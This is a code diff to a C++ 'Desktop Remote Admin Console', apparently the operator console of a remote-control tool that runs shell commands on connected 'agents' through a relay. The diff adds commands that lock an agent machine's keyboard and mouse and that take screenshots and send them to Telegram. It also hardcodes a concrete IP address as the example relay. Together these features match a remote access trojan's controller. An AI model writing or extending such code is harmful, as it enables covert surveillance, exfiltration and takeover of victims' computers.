@@ -19,6 +19,9 @@ void printHelp() {
     std::cout << "\nCommands:\n"
               << "  list              - List all connected agents\n"
               << "  select <id>       - Select agent to control\n"
+              << "  lock              - Lock keyboard and mouse on agent\n"
+              << "  unlock            - Unlock keyboard and mouse on agent\n"
+              << "  screenshot        - Take screenshot and send to Telegram\n"
               << "  <command>         - Execute shell command on selected agent\n"
               << "  help              - Show this help\n"
               << "  exit              - Disconnect and exit\n"
@@ -51,20 +54,25 @@ void printAgents(const std::vector<RemoteProto::AgentInfo>& agents) {
     std::cout << std::endl;
 }
 
+// Порт по умолчанию
+constexpr uint16_t DEFAULT_PORT = 9999;
+
 void printUsage(const char* program) {
-    std::cout << "Usage: " << program << " <relay_host> <token> [options]\n"
+    std::cout << "Desktop Remote Admin Console\n"
+              << "============================\n\n"
+              << "Usage: " << program << " <relay_host> <token>\n\n"
+              << "Использует порт " << DEFAULT_PORT << " по умолчанию\n\n"
               << "Options:\n"
-              << "  -p, --port <port>    Relay server port (default: 9999)\n"
-              << "  -h, --help           Show this help\n"
-              << "\nExample:\n"
-              << "  " << program << " my-vps.example.com mySecretToken123\n"
+              << "  -h, --help           Показать справку\n"
+              << "\nПример:\n"
+              << "  " << program << " 213.108.4.126 mySecretToken123\n"
               << std::endl;
 }
 
 int main(int argc, char* argv[]) {
     std::string relay_host;
     std::string token;
-    uint16_t port = 9999;
+    uint16_t port = DEFAULT_PORT;
     
     // Парсим аргументы
     for (int i = 1; i < argc; ++i) {
@@ -73,10 +81,6 @@ int main(int argc, char* argv[]) {
         if (arg == "-h" || arg == "--help") {
             printUsage(argv[0]);
             return 0;
-        } else if (arg == "-p" || arg == "--port") {
-            if (i + 1 < argc) {
-                port = static_cast<uint16_t>(std::stoi(argv[++i]));
-            }
         } else if (relay_host.empty() && arg[0] != '-') {
             relay_host = arg;
         } else if (token.empty() && arg[0] != '-') {
@@ -114,7 +118,9 @@ int main(int argc, char* argv[]) {
         if (client.getSelectedAgent().empty()) {
             std::cout << "admin> ";
         } else {
-            std::cout << "admin@" << client.getSelectedAgent() << "> ";
+            // Показываем статус блокировки: 🔒 если заблокировано
+            std::string lock_indicator = client.isInputLocked() ? " \033[1;31m[LOCKED]\033[0m" : "";
+            std::cout << "admin@" << client.getSelectedAgent() << lock_indicator << "> ";
         }
         std::cout.flush();
         
@@ -150,6 +156,28 @@ int main(int argc, char* argv[]) {
         // Если агент не выбран, предупреждаем
         if (client.getSelectedAgent().empty()) {
             std::cout << "No agent selected. Use 'list' and 'select <id>' first." << std::endl;
+            continue;
+        }
+        
+        if (input == "lock") {
+            if (client.lockInput()) {
+                std::cout << "\033[1;32m✓ Input locked on agent\033[0m" << std::endl;
+            }
+            continue;
+        }
+        
+        if (input == "unlock") {
+            if (client.unlockInput()) {
+                std::cout << "\033[1;32m✓ Input unlocked on agent\033[0m" << std::endl;
+            }
+            continue;
+        }
+        
+        if (input == "screenshot") {
+            std::cout << "📸 Taking screenshot..." << std::endl;
+            if (client.takeScreenshot()) {
+                std::cout << "\033[1;32m✓ Screenshot sent to Telegram!\033[0m" << std::endl;
+            }
             continue;
         }
         
